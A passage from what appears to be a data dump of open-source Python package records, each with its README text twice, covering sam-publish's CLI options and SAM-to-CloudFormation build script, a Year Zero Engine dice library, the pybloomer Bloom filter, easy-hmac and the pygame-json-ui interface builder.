  `--layer-folder LAYER_FOLDER` - Location the layer assets should be stored, this is appended to the target-asset-folder [default: layer].

  `--statemachine-folder STATEMACHINE_FOLDER` - Location the statemachine assets should be stored, this is appended to the target-asset-folder [default: statemachine].

  `--target-asset-bucket TARGET_ASSET_BUCKET` - Bucket the assets will be stored in.  This is used update the references in the CloudFormation template.  The assets are not actually copied to this bucket.  Typically this will be done using an `aws s3 sync` command

  `--target-prefix TARGET_PREFIX` - Prefix that should be applied to the updated references in the CloudFormation template if the assets are not going to uploaded to the root [default: ''].

  `--move-assets` - Should references to the assets in the CloudFormation template be updated to a different bucket [default: False]

  `--tidy-tags-metadata` - Should SAM tags and metadata be tidied up [Default: True]?

  `--add-layout-gaps` - Should a new line be added between each resource for readability [Default: True]?

  `--debug` - Enables debug logging [Default: False]

  `--verbose` - Enables verbose logging [Default: True]

# Example uses

Assuming that you have a SAM Template in the current folder e.g. https://github.com/peterjdavis/sam-publish/blob/main/samples/sam-template.yaml then the following commands could be used to transform this to the CloudFormation template shown at https://github.com/peterjdavis/sam-publish/blob/main/samples/cfn-template.yaml
```bash
#!/bin/bash

# Create a virtual environment
python3 -m venv .venv
source .venv/bin/activate

# Install sam-publish
pip3 install sam-publish

# Get some environment variables
AWSAccount=$(aws sts get-caller-identity --query Account --output text)
AWSRegion=$(aws configure get region)
export tmpCFNDir=$(mktemp -d)

# Build the SAM project
sam build -t sam-template.yaml

# Check to make sure the bucket for the SAM assets exists
if aws s3api head-bucket --bucket sam-${AWSAccount}-${AWSRegion} 2>/dev/null; \
    then echo Bucket sam-${AWSAccount}-${AWSRegion} exists; \
    else echo Creating bucket sam-${AWSAccount}-${AWSRegion} && \
        aws s3 mb s3://sam-${AWSAccount}-${AWSRegion} --region ${AWSRegion} ; \
    fi

# Package the SAM template so the assets are available in the s3 bucket and teh updated template is available
sam package -t sam-template.yaml \
            --output-template-file ${tmpCFNDir}/sam-template.tmp.yaml \
            --s3-bucket sam-${AWSAccount}-${AWSRegion} 

# Update the CloudFormation tempalte so lambda's with an InlineSAMFunction: true metadata tag are inlined
# assets are referenced from a parameter call AssetBucket and the layer and lambda are referenced from a default prefix
sam-publish \
    --working-folder ${tmpCFNDir} \
    --cfn-input-template ${tmpCFNDir}/sam-template.tmp.yaml \
    --cfn-output-template cfn-template.yaml \
    --target-asset-folder assets/cfn \
    --target-asset-bucket AssetBucket \
    --move-assets \
    --verbose

# Tidy up the temporary folder
rm -rf ${tmpCFNDir}
```
",peterjdavis/sam-publish
yze,https://github.com/nlegrand/yze,0,3621,3621,"The main goal of this Python library is to propose an object to emulate
Year Zero Engine dice throwing.

# System supported:
- [X] Mutant: Year Zero
- [X] Forbidden Lands
- [ ] Twilight 2000
- [X] Alien
- [ ] Blade Runner

# Example
```
. my_py_venv/bin/activate
git clone https://github.com/nlegrand/yze.git
cd yze
python -m pip install -e .
python
Python 3.11.3 (main, Apr  8 2023, 02:16:51) [Clang 14.0.0 (clang-1400.0.29.202)] on darwin
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> from yze.dice import MutantDicePool
>>> d = MutantDicePool(attr=3, skill=2, gear=2)
>>> d.throw()
{'attr': [5, 6, 6], 'skill': [1, 4], 'gear': [6, 2]}
>>> d.push()
{'attr': [2, 6, 6], 'skill': [5, 2], 'gear': [6, 1]}
>>> from yze.dice import FBLDicePool
>>> fbl = FBLDicePool(attr=2, skill=1, artefact=12)
>>> fbl.throw()
{'attr': [2, 2], 'skill': [2], 'gear': [], 'artefact': (8, 2)}
>>> fbl.push()
{'attr': [2, 6], 'skill': [3], 'gear': [], 'artefact': (8, 2)}
>>> from yze.dice import AlienDicePool
>>> alien = AlienDicePool(pool=4, stress=1)
>>> alien.throw()
{'pool': [4, 1, 6, 1], 'stress': [2]}
>>> alien.push()
{'pool': [1, 3, 6, 2], 'stress': [1, 1]}
```

# Odds of pushing

Free League gives very general chances to get a succes when throwing
and pushing a dice pool according to it’s size. But how can we get
odds after the first roll is made? `mutant_odds_of_pushing` tries do
do exactly that. Here is the doc:

```
$ mutant_odds_of_pushing  --help           
usage: mutant_odds_of_pushing [-h] [-t THROWS] -a ATTRIBUTE_DICE [-s SKILL_DICE] [-g GEAR_DICE]

Once you get a result, what are your odds when pushing it? feed this command your results and see what is likely or not to happen

options:
  -h, --help            show this help message and exit
  -t THROWS, --throws THROWS
  -a ATTRIBUTE_DICE, --attribute_dice ATTRIBUTE_DICE
                        List your dice results eg: 253
  -s SKILL_DICE, --skill_dice SKILL_DICE
                        List your dice results eg: 45
  -g GEAR_DICE, --gear_dice GEAR_DICE
                        List your dice results eg: 32

Experimental probabilities made with pseudo random numbers. Maybie it’s not the best you can get :).
```
And here is an example:


```
$ mutant_odds_of_pushing -a 253 -s 45 -g 32
Throwing dice 100000 times !
Odds of having:
    -at least one success: 72.026 %
    -at least one attr botch: 42.091 %
    -at least one gear botch: 30.404 %
    - 1 successes: 39.356 %
    - 2 successes: 23.168 %
    - 3 successes: 7.759 %
    - 4 successes: 1.543 %
    - 5 successes: 0.192 %
    - 6 successes: 0.008 %
    - 1 attribute botchs: 34.628 %
    - 2 attribute botchs: 6.957 %
    - 3 attribute botchs: 0.506 %
    - 1 gear botchs: 27.686 %
    - 2 gear botchs: 2.718 %
```

Running multiple times produce different odds, but in the same order.

# Benchmark
You can also benchmark dice throw to see what are your chances to get
some successes or damage.

```
benchmark_mutant --throws 10000 --attribute 4 --skill 2 --gear 1
Throwing dice 10000 times !
    at least one success : 7243
    at least one pushed success : 9096
    at least one damage to attribute : 7245
    at least one damage to gear : 2767
{   'atleast_one': 7243,
    'atleast_one_attr_botch': 7245,
    'atleast_one_gear_botch': 2767,
    'atleast_one_pushed': 9096,
    'attribute_botched': {1: 4158, 2: 2404, 3: 622, 4: 61},
    'gear_botched': {1: 2767},
    'pushed_successes': {1: 2666, 2: 3304, 3: 2070, 4: 843, 5: 194, 6: 19},
    'successes': {1: 3895, 2: 2424, 3: 757, 4: 154, 5: 13}}
```

Yes I know, I can improve this output :). I'll do it!
","The main goal of this Python library is to propose an object to emulate
Year Zero Engine dice throwing.

# System supported:
- [X] Mutant: Year Zero
- [X] Forbidden Lands
- [ ] Twilight 2000
- [X] Alien
- [ ] Blade Runner

# Example
```
. my_py_venv/bin/activate
git clone https://github.com/nlegrand/yze.git
cd yze
python -m pip install -e .
python
Python 3.11.3 (main, Apr  8 2023, 02:16:51) [Clang 14.0.0 (clang-1400.0.29.202)] on darwin
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
>>> from yze.dice import MutantDicePool
>>> d = MutantDicePool(attr=3, skill=2, gear=2)
>>> d.throw()
{'attr': [5, 6, 6], 'skill': [1, 4], 'gear': [6, 2]}
>>> d.push()
{'attr': [2, 6, 6], 'skill': [5, 2], 'gear': [6, 1]}
>>> from yze.dice import FBLDicePool
>>> fbl = FBLDicePool(attr=2, skill=1, artefact=12)
>>> fbl.throw()
{'attr': [2, 2], 'skill': [2], 'gear': [], 'artefact': (8, 2)}
>>> fbl.push()
{'attr': [2, 6], 'skill': [3], 'gear': [], 'artefact': (8, 2)}
>>> from yze.dice import AlienDicePool
>>> alien = AlienDicePool(pool=4, stress=1)
>>> alien.throw()
{'pool': [4, 1, 6, 1], 'stress': [2]}
>>> alien.push()
{'pool': [1, 3, 6, 2], 'stress': [1, 1]}
```

# Odds of pushing

Free League gives very general chances to get a succes when throwing
and pushing a dice pool according to it’s size. But how can we get
odds after the first roll is made? `mutant_odds_of_pushing` tries do
do exactly that. Here is the doc:

```
$ mutant_odds_of_pushing  --help           
usage: mutant_odds_of_pushing [-h] [-t THROWS] -a ATTRIBUTE_DICE [-s SKILL_DICE] [-g GEAR_DICE]

Once you get a result, what are your odds when pushing it? feed this command your results and see what is likely or not to happen

options:
  -h, --help            show this help message and exit
  -t THROWS, --throws THROWS
  -a ATTRIBUTE_DICE, --attribute_dice ATTRIBUTE_DICE
                        List your dice results eg: 253
  -s SKILL_DICE, --skill_dice SKILL_DICE
                        List your dice results eg: 45
  -g GEAR_DICE, --gear_dice GEAR_DICE
                        List your dice results eg: 32

Experimental probabilities made with pseudo random numbers. Maybie it’s not the best you can get :).
```
And here is an example:


```
$ mutant_odds_of_pushing -a 253 -s 45 -g 32
Throwing dice 100000 times !
Odds of having:
    -at least one success: 72.026 %
    -at least one attr botch: 42.091 %
    -at least one gear botch: 30.404 %
    - 1 successes: 39.356 %
    - 2 successes: 23.168 %
    - 3 successes: 7.759 %
    - 4 successes: 1.543 %
    - 5 successes: 0.192 %
    - 6 successes: 0.008 %
    - 1 attribute botchs: 34.628 %
    - 2 attribute botchs: 6.957 %
    - 3 attribute botchs: 0.506 %
    - 1 gear botchs: 27.686 %
    - 2 gear botchs: 2.718 %
```

Running multiple times produce different odds, but in the same order.

# Benchmark
You can also benchmark dice throw to see what are your chances to get
some successes or damage.

```
benchmark_mutant --throws 10000 --attribute 4 --skill 2 --gear 1
Throwing dice 10000 times !
    at least one success : 7243
    at least one pushed success : 9096
    at least one damage to attribute : 7245
    at least one damage to gear : 2767
{   'atleast_one': 7243,
    'atleast_one_attr_botch': 7245,
    'atleast_one_gear_botch': 2767,
    'atleast_one_pushed': 9096,
    'attribute_botched': {1: 4158, 2: 2404, 3: 622, 4: 61},
    'gear_botched': {1: 2767},
    'pushed_successes': {1: 2666, 2: 3304, 3: 2070, 4: 843, 5: 194, 6: 19},
    'successes': {1: 3895, 2: 2424, 3: 757, 4: 154, 5: 13}}
```

Yes I know, I can improve this output :). I'll do it!
",nlegrand/yze
loadmemory,https://github.com/zhouwe1/loadmemory_util,0,6,6,"tools
","tools
",zhouwe1/loadmemory_util
pybloomer,https://github.com/masroore/pybloomer,0,3822,3822,"# pybloomer

[pybloomer](https://github.com/masroore/pybloomer) is a Python 3 compatible fork of [pybloomfiltermmap](https://github.com/axiak/pybloomfiltermmap) by [@axiak](https://github.com/axiak).

The goal of `pybloomer` is simple: to provide a fast, simple, scalable, correct library for Bloom filters in Python.

[![Documentation Status](https://readthedocs.org/projects/pybloomer/badge/?version=latest)](https://pybloomer.readthedocs.io/en/latest/?badge=latest)
[![PyPI](https://img.shields.io/pypi/v/pybloomer.svg)](https://pypi.python.org/pypi/pybloomer)
[![PyPI](https://img.shields.io/pypi/dw/pybloomer.svg)](https://pypi.python.org/pypi/pybloomer)
[![PyPI](https://img.shields.io/pypi/pyversions/pybloomer.svg)](https://pypi.python.org/pypi/pybloomer)


## Why pybloomer?

There are a couple reasons to use this module:

* It natively uses [mmaped files](http://en.wikipedia.org/wiki/Mmap).
* It is fast (see [benchmarks](http://axiak.github.io/pybloomfiltermmap/#benchmarks)).
* It natively does the set things you want a Bloom filter to do.


## Quickstart

After you install, the interface to use is a cross between a file
interface and an ste interface. As an example:
```python
    >>> import pybloomer
    >>> fruit = pybloomer.BloomFilter(100000, 0.1, '/tmp/words.bloom')
    >>> fruit.update(('apple', 'pear', 'orange', 'apple'))
    >>> len(fruit)
    3
    >>> 'mike' in fruit
    False
    >>> 'apple' in fruit
    True
```

To create an in-memory filter, simply omit the file location:
```python
    >>> cakes = pybloomer.BloomFilter(10000, 0.1)
```
*Caveat*: it is currently not possible to persist this filter later.


## Docs

Current docs are available at [pybloomer.rtfd.io](https://pybloomer.readthedocs.io/en/latest).


## Install

To install:

```shell
    $ pip install pybloomer
```

and you should be set.

### Note to Python 2 to < 3.5 users

This library is specifically meant for Python 3.5 and above. [As of 2020](https://www.python.org/doc/sunset-python-2/), we strongly advise you to switch to an actively maintained distribution of Python 3. If for any reason your current environment is restricted to Python 2, please see [pybloomfiltermmap](https://github.com/axiak/pybloomfiltermmap). Please note that the latter is not actively maintained and will lack bug fixes and new features.


## History and Future

[pybloomfiltermmap](https://github.com/axiak/pybloomfiltermmap) is an excellent Bloom filter implementation for Python 2 by [@axiak](https://github.com/axiak) and contributors. I, [@prashnts](https://github.com/prashnts), made initial changes to add support for Python 3 sometime in 2016 as the current [pybloomer](https://pypi.org/project/pybloomer/) on `PyPI`. Since then, with the help of contributors, there have been incremental improvements and bug fixes while maintaining the API from versions `0.4.x` and below.

Some new features and changes were first introduced in version `0.5.0`. From this point on, the goal is to reach stability, as well as add a few more APIs to expand upon the use cases. While we can't guarantee that we won't change the current interface, the transition from versions `0.4.x` and below should be quick one liners. Please open an issue if we broke your build!

Suggestions, bug reports, and / or patches are welcome!


## Contributions and development

When contributing, you should set up an appropriate Python 3 environment and install the dependencies listed in `requirements-dev.txt`.
Package installation depends on a generated `pybloomer.c` file, which requires Cython module to be in your current environment.


## Maintainers

* [Dr. Masroor Ehsan](https://github.com/masroore)

## License

See the LICENSE file. It's under the MIT License.
","# pybloomer

[pybloomer](https://github.com/masroore/pybloomer) is a Python 3 compatible fork of [pybloomfiltermmap](https://github.com/axiak/pybloomfiltermmap) by [@axiak](https://github.com/axiak).

The goal of `pybloomer` is simple: to provide a fast, simple, scalable, correct library for Bloom filters in Python.

[![Documentation Status](https://readthedocs.org/projects/pybloomer/badge/?version=latest)](https://pybloomer.readthedocs.io/en/latest/?badge=latest)
[![PyPI](https://img.shields.io/pypi/v/pybloomer.svg)](https://pypi.python.org/pypi/pybloomer)
[![PyPI](https://img.shields.io/pypi/dw/pybloomer.svg)](https://pypi.python.org/pypi/pybloomer)
[![PyPI](https://img.shields.io/pypi/pyversions/pybloomer.svg)](https://pypi.python.org/pypi/pybloomer)


## Why pybloomer?

There are a couple reasons to use this module:

* It natively uses [mmaped files](http://en.wikipedia.org/wiki/Mmap).
* It is fast (see [benchmarks](http://axiak.github.io/pybloomfiltermmap/#benchmarks)).
* It natively does the set things you want a Bloom filter to do.


## Quickstart

After you install, the interface to use is a cross between a file
interface and an ste interface. As an example:
```python
    >>> import pybloomer
    >>> fruit = pybloomer.BloomFilter(100000, 0.1, '/tmp/words.bloom')
    >>> fruit.update(('apple', 'pear', 'orange', 'apple'))
    >>> len(fruit)
    3
    >>> 'mike' in fruit
    False
    >>> 'apple' in fruit
    True
```

To create an in-memory filter, simply omit the file location:
```python
    >>> cakes = pybloomer.BloomFilter(10000, 0.1)
```
*Caveat*: it is currently not possible to persist this filter later.


## Docs

Current docs are available at [pybloomer.rtfd.io](https://pybloomer.readthedocs.io/en/latest).


## Install

To install:

```shell
    $ pip install pybloomer
```

and you should be set.

### Note to Python 2 to < 3.5 users

This library is specifically meant for Python 3.5 and above. [As of 2020](https://www.python.org/doc/sunset-python-2/), we strongly advise you to switch to an actively maintained distribution of Python 3. If for any reason your current environment is restricted to Python 2, please see [pybloomfiltermmap](https://github.com/axiak/pybloomfiltermmap). Please note that the latter is not actively maintained and will lack bug fixes and new features.


## History and Future

[pybloomfiltermmap](https://github.com/axiak/pybloomfiltermmap) is an excellent Bloom filter implementation for Python 2 by [@axiak](https://github.com/axiak) and contributors. I, [@prashnts](https://github.com/prashnts), made initial changes to add support for Python 3 sometime in 2016 as the current [pybloomer](https://pypi.org/project/pybloomer/) on `PyPI`. Since then, with the help of contributors, there have been incremental improvements and bug fixes while maintaining the API from versions `0.4.x` and below.

Some new features and changes were first introduced in version `0.5.0`. From this point on, the goal is to reach stability, as well as add a few more APIs to expand upon the use cases. While we can't guarantee that we won't change the current interface, the transition from versions `0.4.x` and below should be quick one liners. Please open an issue if we broke your build!

Suggestions, bug reports, and / or patches are welcome!


## Contributions and development

When contributing, you should set up an appropriate Python 3 environment and install the dependencies listed in `requirements-dev.txt`.
Package installation depends on a generated `pybloomer.c` file, which requires Cython module to be in your current environment.


## Maintainers

* [Dr. Masroor Ehsan](https://github.com/masroore)

## License

See the LICENSE file. It's under the MIT License.
",masroore/pybloomer
easy-hmac,https://github.com/garrethcain/easy-hmac/,0,1118,1118,"# HMAC Authentication (easy-hmac)

A pure python package that handles the generation and verification of HMAC 
signatures.

# Installation
TODO: modify installation instructions when the package is hosted on GITLAB.

This package is hosted at ???

## User
If you ARE NOT a developer, just install the package from TBD

## Developer
1. Clone this repository
2. Build the package in your local environment. Make sure you have a pipenv
    virtual environment active and run:

```shell
pipenv install build
pipenv shell
python -m build easy-hmac
```
3. Install the easy-hmac package in editing mode by running:

```shell
pip install -e easy-hmac
```

4. If you want to make sure everything went well, try running the tests from
    test_easy-hmac

```shell
python easy_hmac/test/test_easy-hmac.py
```

# Usage
`easy-hmac` provides two helper functions for HMAC authentication:

- `generate_hmac_sha256` - generates a SHA256 HMAC from two strings (a secret
    key and a http message)
- `verify_hmac` - given an HMAC and a message, verifies if the HMAC generated by
    the message is equal to the one passed as argument

","# HMAC Authentication (easy-hmac)

A pure python package that handles the generation and verification of HMAC 
signatures.

# Installation
TODO: modify installation instructions when the package is hosted on GITLAB.

This package is hosted at ???

## User
If you ARE NOT a developer, just install the package from TBD

## Developer
1. Clone this repository
2. Build the package in your local environment. Make sure you have a pipenv
    virtual environment active and run:

```shell
pipenv install build
pipenv shell
python -m build easy-hmac
```
3. Install the easy-hmac package in editing mode by running:

```shell
pip install -e easy-hmac
```

4. If you want to make sure everything went well, try running the tests from
    test_easy-hmac

```shell
python easy_hmac/test/test_easy-hmac.py
```

# Usage
`easy-hmac` provides two helper functions for HMAC authentication:

- `generate_hmac_sha256` - generates a SHA256 HMAC from two strings (a secret
    key and a http message)
- `verify_hmac` - given an HMAC and a message, verifies if the HMAC generated by
    the message is equal to the one passed as argument

",garrethcain/easy-hmac
stc-tools,https://github.com/nexus-stc/stc,4,0,0,,,nexus-stc/stc
pygame-json-ui,https://github.com/RednaxGaming/pygame_ui,1,8634,8634,"
# Pygame UI README

[![Licence](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)

[Pygame UI](https://github.com/RednaxGaming/pygame_ui) is a package for building user interfaces for [pygame](https://www.pygame.org/) in JSON.

It is currently a work in progress, but if you wanna test it out, feel free to do so :)

## Table Of Content

- [Quick Start](#quick-start)
   - [Installation](#installation)
   - [Setup](#setup)
      - [Python](#python-file)
      - [JSON](#json-file)
- [Element List](#element-list)
- [Attribute List](#attribute-list)
   - [General](#general)
   - [Frame](#frame)
   - [Label](#label)
   - [Button](#button)
   - [Switch](#switch)
   - [Slider](#slider)
- [Frames](#frames)
   - [Frame Path](#frame-path)
- [Examples](#examples)
- [FAQ](#faq)

## Quick Start

### Installation

Pygame UI is available on PyPi:

```shell
pip install pygame-json-ui
```
In case this doesn't work, you'll need to manually add the pygame_ui folder to your site-packages.

When this is done you can test your installation, by executing the following:
```python
>>> import pygame_ui
>>> pygame_ui.test()
Successfully installed! enjoy :)
Version: x.x.x.x
```

### Setup

You will have two files in the same folder:
- whatever.py
- Interface.json <-- Name for automatically loading the file

If you prefer a different name for the json file, or Pygame UI is having issues locating it automatically, you can pass the absolute path to it's parent folder as an argument for `pygame_ui.init()`.

Here a simple example for making a label:

#### Python File

Notice that the `event_handler` is not required unless you want interactive elements to function as expected.

```python
import pygame
import pygame_ui

# Creating a window
pygame.init()
screen = pygame.display.set_mode((1280, 720), vsync=1)
pygame.display.set_caption(""GUI"")
clock = pygame.time.Clock()


# Initializing interface
Interface = pygame_ui.init()


while True:
   for event in pygame.event.get():
      if event.type == pygame.QUIT:
         quit()
      # Call event handler
      Interface.event_handler(event)

   screen.fill((0,0,0))

   # Draw interface
   Interface.draw(screen)

   pygame.display.flip()
   clock.tick(60)
```

#### JSON File
MUST be named `Interface.json` and in the same folder as python file for loading the json file automatically!

```json
{
   ""test_label"": {
      ""type"": ""label"",
      ""position"": [200,100],
      ""size"": [120,80],
      ""background_color"": [200,0,0],
      ""text"": ""IT WORKS!"",
      ""font_size"": 20,
      ""auto_size"": true
   }
}
```

## Element List

All of the following items will be refered to as `elements`:
- Frame
- Label
- Button
- Switch
- Slider
- Dropdown (Coming soon)

## Attribute List
- `attribute: data type` description (default value).
### General
These attributes can be given to any element type
- `type: str` REQUIRED, specifies which element this is choose from [this](#element-list) list.
- `position: [x,y]` Sets position from top-left of screen to top-left of element boundry box ([0, 0]).
- `size: [x,y]` Sets the size of the element boundry box ([0, 0]).
- `background_color: (r,g,b)` The boundry box will be filled with this color (none).
- `is_visible: bool` (true).
- `is_hoverable: bool` (false).
- `is_clickable: bool` (false).

### Frame
- `contents: {}` See [frames](#frames) for more info.

### Label

- `text: str` Exactly what you think it is.
- `text_color: (r,g,b)` ([255,255,255])
- `text_aa: bool` anti-aliasing (true)
- `font_name: str` ('Arial')
- `font_size: int` (10)
- `font_bold: bool` (false)
- `font_italic: bool` (false)
- `auto_size: bool` This will overwrite size of the boundry box to fit the text within (false).

### Button

- `contents: {}` The button is basically just a frame with the following default attributes added to it. Making a button manually from a frame is possible, but deprecated.
- `is_clickable: bool` (true)
- `is_hoverable: bool` (true)
- `click_start: bool` (false)
- `click_end: bool` (false)
- `click_held: bool` (false)
- `hover_start: bool` (false)
- `hover_end: bool` (false)
- `hover_held: bool` (false)

### Switch
- `state: bool` Represents the current state of the switch on/off (false)
- `preset: str` A preset for it's looks. Only existing preset is currently: ""simple"" (none)
- `is_clickable: bool` (true)
- `is_hoverable: bool` (true)
- `click_start: bool` (false)
- `click_end: bool` (false)
- `click_held: bool` (false)
- `hover_start: bool` (false)
- `hover_end: bool` (false)
- `hover_held: bool` (false)

### Slider
- `value_min: int/float` Lower end of the slider (0)
- `value_max: int/float` Uppper end of the slider (1)
- `value: int/float` Represents the current value of the slider (0)
- `preset: str` A preset for it's looks. Only existing preset is currently: ""simple"" (none)
- `is_clickable: bool` (true)
- `is_hoverable: bool` (true)
- `click_start: bool` (false)
- `click_end: bool` (false)
- `click_held: bool` (false)
- `hover_start: bool` (false)
- `hover_end: bool` (false)
- `hover_held: bool` (false)

## Frames

Frames can contain `elements` Just like how a folder can contain files and other folders.
Frames can also hold other frames, and yes, those can contain frames aswell (see [Frame-ception](#frame-ception)). When a frame is invisible, it's `elements` will also be invisible. Deleting a frame will also delete it's `elements`.

### Frame Path

A frame path is a string representation of the route to a certain frame.

Say we have the following json file
```json
{
   ""Arthur"": {
      ""type"": ""frame""
      ""contents"": {
         ""Bertha"": {
            ""type"": ""frame""
            ""contents"": {
               ""Pippinpaddleopsicopolis"": {
                  ""type"": ""frame""
               }
            }
         },
         ""Cedric"": {
            ""type"": ""frame""
         }
      }
   }
}
```

and i wanted to access `Pippinpaddleopsicopolis`

The syntax for the frame path is very simple:
```python
""Arthur->Bertha->Pippinpaddleopsicopolis""
```

## Examples

All examples use [this](#python-file) python file as base.

### A button

```json
{
   ""harry the button"": {
      ""type"": ""button"",
      ""position"": [250,120],
      ""size"": [200,200],
      ""background_color"": [100,0,0],
      ""contents"": {
         ""jonathan the label"": {
            ""type"": ""label"",
            ""position"": [260,150],
            ""font_size"": 30,
            ""auto_size"": true
         }
      }
   }
}
```
With this called after `pygame_ui.init()`:
```python
harry = Interface.get_element('harry the button', 'frame1->frame2')
jonathan = Interface.get_element('jonathan the label', 'frame1->frame2->harry the button')
```
And this between `event_handler()` and `draw()`:
```python
jonathan.text = ""start: ""+str(harry.click_start)+"", end: ""+str(harry.click_end)+"", held: ""+str(harry.held)
```


### Adding An Element Post Initialization

```python
play_label = pygame_ui.label(position=[100,100], size=[100,100], text=""play now"", text_size=20)
Interface.add_element('play', play_label)
```

### Adding An Element To A Frame

```python
play_label = pygame_ui.label(position=[100,100], size=[100,100], text=""play now"", text_size=20)
Interface.add_element('play', play_label, 'Arthur->Bertha->Pippinpaddleopsicopolis')
```

### Removing An Element From A Frame

```python
Interface.remove_element('Pippinpaddleopsicopolis', 'Arthur->Bertha')
```

### Get Element Object
```python
play_label = Interface.get_element('play', 'Arthur->Bertha->Pippinpaddleopsicopolis')
play_label.text = 'THE THIRD'
```

### Frame-ception

Just... don't ask me why.

#### Python
```python
import pygame
import pygame_ui

pygame.init()
screen = pygame.display.set_mode((1280, 720), vsync=1)
pygame.display.set_caption(""Frame-ception"")
clock = pygame.time.Clock()

Interface = pygame_ui.init()

path = 'frame0'
for i in range(100):
   frame = 'frame'+str(i+1)
   Interface.add_element(frame, pygame_ui.frame(), path)
   path += '->'+frame

while True:
   for event in pygame.event.get():
      if event.type == pygame.QUIT:
         quit()

   screen.fill((0,0,0))

   Interface.draw(screen)

   pygame.display.flip()
   clock.tick(60)
```

#### JSON
```json
{
   ""frame0"": {
      ""type"": ""frame"",
      ""contents"": {}
   }
}
```

## FAQ

Nothing yet lol.
","
# Pygame UI README

[![Licence](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT)

[Pygame UI](https://github.com/RednaxGaming/pygame_ui) is a package for building user interfaces for [pygame](https://www.pygame.org/) in JSON.

It is currently a work in progress, but if you wanna test it out, feel free to do so :)

## Table Of Content

- [Quick Start](#quick-start)
   - [Installation](#installation)
   - [Setup](#setup)
      - [Python](#python-file)
      - [JSON](#json-file)
- [Element List](#element-list)
- [Attribute List](#attribute-list)
   - [General](#general)
   - [Frame](#frame)
   - [Label](#label)
   - [Button](#button)
   - [Switch](#switch)
   - [Slider](#slider)
- [Frames](#frames)
   - [Frame Path](#frame-path)
- [Examples](#examples)
- [FAQ](#faq)

## Quick Start

### Installation

Pygame UI is available on PyPi:

```shell
pip install pygame-json-ui
```
In case this doesn't work, you'll need to manually add the pygame_ui folder to your site-packages.

When this is done you can test your installation, by executing the following:
```python
>>> import pygame_ui
>>> pygame_ui.test()
Successfully installed! enjoy :)
Version: x.x.x.x
```

### Setup

You will have two files in the same folder:
- whatever.py
- Interface.json <-- Name for automatically loading the file

If you prefer a different name for the json file, or Pygame UI is having issues locating it automatically, you can pass the absolute path to it's parent folder as an argument for `pygame_ui.init()`.

Here a simple example for making a label:

#### Python File

Notice that the `event_handler` is not required unless you want interactive elements to function as expected.

```python
import pygame
import pygame_ui

# Creating a window
pygame.init()
screen = pygame.display.set_mode((1280, 720), vsync=1)
pygame.display.set_caption(""GUI"")
clock = pygame.time.Clock()


# Initializing interface
Interface = pygame_ui.init()


while True:
   for event in pygame.event.get():
      if event.type == pygame.QUIT:
         quit()
      # Call event handler
      Interface.event_handler(event)

   screen.fill((0,0,0))

   # Draw interface
   Interface.draw(screen)

   pygame.display.flip()
   clock.tick(60)
```

#### JSON File
MUST be named `Interface.json` and in the same folder as python file for loading the json file automatically!

```json
{
   ""test_label"": {
      ""type"": ""label"",
      ""position"": [200,100],
      ""size"": [120,80],
      ""background_color"": [200,0,0],
      ""text"": ""IT WORKS!"",
      ""font_size"": 20,
      ""auto_size"": true
   }
}
```

## Element List

All of the following items will be refered to as `elements`:
- Frame
- Label
- Button
- Switch
- Slider
- Dropdown (Coming soon)

## Attribute List
- `attribute: data type` description (default value).
### General
These attributes can be given to any element type
- `type: str` REQUIRED, specifies which element this is choose from [this](#element-list) list.
- `position: [x,y]` Sets position from top-left of screen to top-left of element boundry box ([0, 0]).
- `size: [x,y]` Sets the size of the element boundry box ([0, 0]).
- `background_color: (r,g,b)` The boundry box will be filled with this color (none).
- `is_visible: bool` (true).
- `is_hoverable: bool` (false).
- `is_clickable: bool` (false).

### Frame
- `contents: {}` See [frames](#frames) for more info.

### Label

- `text: str` Exactly what you think it is.
- `text_color: (r,g,b)` ([255,255,255])
- `text_aa: bool` anti-aliasing (true)
- `font_name: str` ('Arial')
- `font_size: int` (10)
- `font_bold: bool` (false)
- `font_italic: bool` (false)
- `auto_size: bool` This will overwrite size of the boundry box to fit the text within (false).

### Button

- `contents: {}` The button is basically just a frame with the following default attributes added to it. Making a button manually from a frame is possible, but deprecated.
- `is_clickable: bool` (true)
- `is_hoverable: bool` (true)
- `click_start: bool` (false)
- `click_end: bool` (false)
- `click_held: bool` (false)
- `hover_start: bool` (false)
- `hover_end: bool` (false)
- `hover_held: bool` (false)

### Switch
- `state: bool` Represents the current state of the switch on/off (false)
- `preset: str` A preset for it's looks. Only existing preset is currently: ""simple"" (none)
- `is_clickable: bool` (true)
- `is_hoverable: bool` (true)
- `click_start: bool` (false)
- `click_end: bool` (false)
- `click_held: bool` (false)
- `hover_start: bool` (false)
- `hover_end: bool` (false)
- `hover_held: bool` (false)

### Slider
- `value_min: int/float` Lower end of the slider (0)
- `value_max: int/float` Uppper end of the slider (1)
- `value: int/float` Represents the current value of the slider (0)
- `preset: str` A preset for it's looks. Only existing preset is currently: ""simple"" (none)
- `is_clickable: bool` (true)
- `is_hoverable: bool` (true)
- `click_start: bool` (false)
- `click_end: bool` (false)
- `click_held: bool` (false)
- `hover_start: bool` (false)
- `hover_end: bool` (false)
- `hover_held: bool` (false)

## Frames

Frames can contain `elements` Just like how a folder can contain files and other folders.
Frames can also hold other frames, and yes, those can contain frames aswell (see [Frame-ception](#frame-ception)). When a frame is invisible, it's `elements` will also be invisible. Deleting a frame will also delete it's `elements`.

### Frame Path

A frame path is a string representation of the route to a certain frame.

Say we have the following json file
```json
{
   ""Arthur"": {
      ""type"": ""frame""
      ""contents"": {
         ""Bertha"": {
            ""type"": ""frame""
            ""contents"": {
               ""Pippinpaddleopsicopolis"": {
                  ""type"": ""frame""
               }
            }
         },
         ""Cedric"": {
            ""type"": ""frame""
         }
      }
   }
}
```

and i wanted to access `Pippinpaddleopsicopolis`

The syntax for the frame path is very simple:
```python
""Arthur->Bertha->Pippinpaddleopsicopolis""
```

## Examples

All examples use [this](#python-file) python file as base.

### A button

```json
{
   ""harry the button"": {
      ""type"": ""button"",
      ""position"": [250,120],
      ""size"": [200,200],
      ""background_color"": [100,0,0],
      ""contents"": {
         ""jonathan the label"": {
            ""type"": ""label"",
            ""position"": [260,150],
            ""font_size"": 30,
            ""auto_size"": true
         }
      }
   }
}
```
With this called after `pygame_ui.init()`:
```python
harry = Interface.get_element('harry the button', 'frame1->frame2')
jonathan = Interface.get_element('jonathan the label', 'frame1->frame2->harry the button')
```
And this between `event_handler()` and `draw()`:
```python
